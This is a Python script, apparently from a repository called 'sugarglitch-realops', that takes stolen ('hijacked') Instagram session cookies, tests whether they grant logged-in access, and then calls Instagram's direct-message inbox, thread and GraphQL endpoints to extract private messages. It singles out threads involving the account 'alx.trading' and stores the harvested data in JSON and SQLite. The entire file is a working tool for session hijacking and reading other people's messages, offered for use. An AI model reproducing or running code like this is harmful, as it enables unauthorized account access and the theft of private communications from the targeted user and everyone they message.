#!/usr/bin/env python3
"""
🚀 REAL ALX.TRADING DM EXTRACTOR - NO MOCKUP
Using actual hijacked sessions for real data extraction
"""

import json
import os
import requests
import time
from datetime import datetime
import sqlite3
from pathlib import Path

class RealDMExtractor:
    def __init__(self):
        self.target = "alx.trading"
        self.hijacked_sessions_dir = "/workspaces/sugarglitch-realops/hijacked_sessions"
        self.output_dir = "/workspaces/sugarglitch-realops/data/real_alx_extraction"
        self.db_path = f"{self.output_dir}/real_dm_data.db"
        
        os.makedirs(self.output_dir, exist_ok=True)
        
        print("🚀 REAL ALX.TRADING DM EXTRACTOR - NO MOCKUP")
        print("=" * 60)
        print(f"Target: {self.target}")
        print(f"Using hijacked sessions from: {self.hijacked_sessions_dir}")
        
    def find_best_session(self):
        """Find the best working session from hijacked sessions"""
        print("\n🔍 Scanning hijacked sessions...")
        
        session_files = []
        for file in os.listdir(self.hijacked_sessions_dir):
            if file.endswith('.json') and 'session' in file:
                session_files.append(file)
        
        print(f"Found {len(session_files)} potential sessions")
        
        # Look for specific session types that might work
        priority_patterns = [
            'hijacked_session',
            'rotated_session', 
            'ip_spoofed_session',
            'spoofed_session'
        ]
        
        for pattern in priority_patterns:
            matching_files = [f for f in session_files if pattern in f]
            if matching_files:
                # Get the latest one
                latest_file = max(matching_files, key=lambda x: os.path.getmtime(
                    os.path.join(self.hijacked_sessions_dir, x)))
                print(f"✅ Selected: {latest_file}")
                return latest_file
        
        # Fallback to any session file
        if session_files:
            latest_file = max(session_files, key=lambda x: os.path.getmtime(
                os.path.join(self.hijacked_sessions_dir, x)))
            print(f"⚠️ Fallback to: {latest_file}")
            return latest_file
        
        return None
    
    def load_hijacked_session(self, session_file):
        """Load hijacked session data"""
        try:
            session_path = os.path.join(self.hijacked_sessions_dir, session_file)
            
            with open(session_path, 'r') as f:
                content = f.read().strip()
            
            # Try to parse JSON
            try:
                session_data = json.loads(content)
                print(f"📄 Session data keys: {list(session_data.keys())}")
                return session_data
            except:
                print("❌ Invalid JSON format")
                return None
                
        except Exception as e:
            print(f"❌ Error loading session: {e}")
            return None
    
    def extract_session_cookies(self, session_data):
        """Extract usable cookies from session data"""
        cookies = {}
        
        if isinstance(session_data, dict):
            # Try different possible cookie locations
            possible_paths = [
                ['cookies'],
                ['sessionid'],
                ['session_cookies'],
                ['hijacked_cookies'],
                ['instagram_cookies'],
                ['original_session', 'cookies'],
                ['hijacked_from', 'cookies']
            ]
            
            for path in possible_paths:
                current = session_data
                try:
                    for key in path:
                        if isinstance(current, dict) and key in current:
                            current = current[key]
                        else:
                            break
                    else:
                        # If we get here, we found data at this path
                        if isinstance(current, dict):
                            cookies.update(current)
                        elif isinstance(current, str) and 'sessionid' in path[-1].lower():
                            cookies['sessionid'] = current
                        print(f"✅ Found cookies at: {' -> '.join(path)}")
                        break
                except:
                    continue
        
        print(f"🔑 Extracted cookies: {list(cookies.keys())}")
        return cookies
    
    def test_session_reality(self, cookies):
        """Test if session gives access to real data"""
        print("\n🧪 Testing session for real access...")
        
        if not cookies or 'sessionid' not in cookies:
            print("❌ No sessionid found")
            return False
        
        session = requests.Session()
        session.cookies.update(cookies)
        
        # Set realistic headers
        headers = {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Referer': 'https://www.instagram.com/',
            'X-Requested-With': 'XMLHttpRequest',
            'X-Instagram-AJAX': '1',
        }
        session.headers.update(headers)
        
        # Test endpoints that would show real vs fake data
        test_endpoints = [
            ('Main page', 'https://www.instagram.com/'),
            ('Profile page', f'https://www.instagram.com/{self.target}/'),
            ('Account info', 'https://www.instagram.com/accounts/edit/'),
            ('Direct inbox', 'https://i.instagram.com/api/v1/direct_v2/inbox/'),
        ]
        
        real_access = False
        
        for name, url in test_endpoints:
            try:
                print(f"🔍 Testing {name}...")
                response = session.get(url, timeout=15, allow_redirects=True)
                
                print(f"   Status: {response.status_code}")
                
                if response.status_code == 200:
                    content = response.text
                    
                    # Check for signs of real logged-in access
                    real_indicators = [
                        '"viewer"',
                        '"is_private"',
                        '"profile_pic_url"',
                        '"username"',
                        '"full_name"',
                        '"following"',
                        '"followers"'
                    ]
                    
                    fake_indicators = [
                        'Log In',
                        'Sign Up',
                        'Login • Instagram',
                        'loginForm'
                    ]
                    
                    real_count = sum(1 for indicator in real_indicators if indicator in content)
                    fake_count = sum(1 for indicator in fake_indicators if indicator in content)
                    
                    print(f"   Real indicators: {real_count}")
                    print(f"   Fake indicators: {fake_count}")
                    
                    if real_count > fake_count and real_count >= 3:
                        print(f"   ✅ Real access detected!")
                        real_access = True
                    else:
                        print(f"   ❌ No real access")
                
            except Exception as e:
                print(f"   ❌ Error: {e}")
        
        return real_access
    
    def extract_real_dms(self, cookies):
        """Extract real DM data using working session"""
        print("\n📨 Extracting real DM data...")
        
        session = requests.Session()
        session.cookies.update(cookies)
        
        # Mobile headers for better API access
        headers = {
            'User-Agent': 'Instagram 219.0.0.12.117 Android (29/10; 420dpi; 1080x2340; xiaomi; Mi 9T; davinci; qcom; en_US; 314665256)',
            'Accept': '*/*',
            'Accept-Language': 'en-US',
            'Accept-Encoding': 'gzip, deflate',
            'X-Requested-With': 'XMLHttpRequest',
            'X-Instagram-AJAX': '1',
            'X-CSRFToken': 'missing',
        }
        session.headers.update(headers)
        
        # First get CSRF token
        try:
            home_response = session.get('https://www.instagram.com/')
            if home_response.status_code == 200:
                import re
                csrf_match = re.search(r'"csrf_token":"([^"]+)"', home_response.text)
                if csrf_match:
                    csrf_token = csrf_match.group(1)
                    session.headers['X-CSRFToken'] = csrf_token
                    print(f"✅ CSRF token: {csrf_token[:20]}...")
        except:
            pass
        
        # Try multiple DM extraction endpoints
        dm_endpoints = [
            ('Instagram API v1', 'https://i.instagram.com/api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20'),
            ('Web API Direct', 'https://www.instagram.com/api/v1/direct_v2/inbox/?visual_message_return_type=unseen'),
            ('GraphQL DMs', 'https://www.instagram.com/api/graphql/'),
            ('Mobile Direct', 'https://i.instagram.com/api/v1/direct_v2/threads/'),
        ]
        
        extracted_data = {}
        
        for name, endpoint in dm_endpoints:
            try:
                print(f"🔍 Trying {name}...")
                
                if 'graphql' in endpoint:
                    # GraphQL query for DMs
                    query_data = {
                        'query_hash': 'bc9b5dae86e1538d50c6ceaa89b8d65f',
                        'variables': json.dumps({
                            'id': self.target,
                            'first': 20
                        })
                    }
                    response = session.post(endpoint, data=query_data, timeout=20)
                else:
                    response = session.get(endpoint, timeout=20)
                
                print(f"   Status: {response.status_code}")
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        
                        # Check if we got real DM data
                        if 'inbox' in data:
                            inbox = data['inbox']
                            if 'threads' in inbox and inbox['threads']:
                                print(f"   ✅ Found {len(inbox['threads'])} threads!")
                                extracted_data[name] = data
                                
                                # Look for alx.trading specifically
                                for thread in inbox['threads']:
                                    thread_users = thread.get('users', [])
                                    usernames = [user.get('username', '') for user in thread_users]
                                    if any(self.target in username for username in usernames):
                                        print(f"   🎯 Found {self.target} thread!")
                                        extracted_data[f"{name}_target_thread"] = thread
                        
                        elif 'threads' in data and data['threads']:
                            print(f"   ✅ Found {len(data['threads'])} threads!")
                            extracted_data[name] = data
                            
                        elif 'data' in data:
                            print(f"   ✅ GraphQL data found")
                            extracted_data[name] = data
                            
                        else:
                            print(f"   ⚠️ Response format: {list(data.keys())}")
                            
                    except json.JSONDecodeError:
                        print(f"   ⚠️ Non-JSON response")
                        # Save HTML for debugging if it contains useful data
                        if self.target.lower() in response.text.lower():
                            debug_file = f"{self.output_dir}/debug_{name.replace(' ', '_')}.html"
                            with open(debug_file, 'w', encoding='utf-8') as f:
                                f.write(response.text)
                            print(f"   📁 Debug saved: {debug_file}")
                
                else:
                    print(f"   ❌ Status {response.status_code}")
                    
            except Exception as e:
                print(f"   ❌ Error: {e}")
        
        return extracted_data
    
    def save_real_data(self, extracted_data):
        """Save extracted real data"""
        if not extracted_data:
            print("❌ No real data to save")
            return None
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Save JSON
        json_file = f"{self.output_dir}/real_dm_extraction_{timestamp}.json"
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump(extracted_data, f, indent=2, ensure_ascii=False)
        
        # Setup database
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS real_extractions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                extraction_time TEXT,
                method TEXT,
                target TEXT,
                data_found BOOLEAN,
                raw_data TEXT
            )
        ''')
        
        # Save to database
        for method, data in extracted_data.items():
            cursor.execute('''
                INSERT INTO real_extractions 
                (extraction_time, method, target, data_found, raw_data)
                VALUES (?, ?, ?, ?, ?)
            ''', (
                timestamp,
                method,
                self.target,
                True,
                json.dumps(data)
            ))
        
        conn.commit()
        conn.close()
        
        print(f"\n📊 REAL DATA SAVED")
        print(f"📁 JSON: {json_file}")
        print(f"🗄️ Database: {self.db_path}")
        print(f"📈 Methods: {len(extracted_data)}")
        
        return json_file
    
    def run_real_extraction(self):
        """Run real extraction using hijacked sessions"""
        print("🚀 Starting REAL extraction (no mockup)...")
        
        # Find best session
        session_file = self.find_best_session()
        if not session_file:
            print("❌ No hijacked sessions found")
            return None
        
        # Load session
        session_data = self.load_hijacked_session(session_file)
        if not session_data:
            print("❌ Could not load session data")
            return None
        
        # Extract cookies
        cookies = self.extract_session_cookies(session_data)
        if not cookies:
            print("❌ No usable cookies found")
            return None
        
        # Test for real access
        if not self.test_session_reality(cookies):
            print("❌ Session does not provide real access")
            return None
        
        # Extract real DMs
        extracted_data = self.extract_real_dms(cookies)
        
        # Save results
        result_file = self.save_real_data(extracted_data)
        
        if extracted_data:
            print(f"\n🎉 REAL EXTRACTION SUCCESSFUL!")
            print(f"✅ Found real data using hijacked session")
            print(f"📁 Results: {result_file}")
        else:
            print(f"\n❌ No real data extracted")
        
        return result_file

if __name__ == "__main__":
    extractor = RealDMExtractor()
    extractor.run_real_extraction()